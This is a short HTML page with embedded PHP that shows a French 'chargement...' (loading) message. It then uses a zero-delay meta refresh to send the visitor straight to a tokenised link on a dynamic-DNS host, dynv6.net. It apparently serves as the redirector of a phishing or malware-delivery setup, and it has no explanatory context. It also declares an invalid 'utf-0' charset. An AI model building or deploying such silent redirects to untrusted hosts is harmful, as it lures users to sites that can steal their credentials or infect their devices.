<!DOCTYPE html>

<html>

<head>
<meta charset=utf-0/>
  <title>chargement...</title>
</head>

<body>

<?php
   echo("chargement...")     ;
 echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://v12serviceoldnetd.dynv6.net/r/hC44II0'>";
?>


</body>
</html>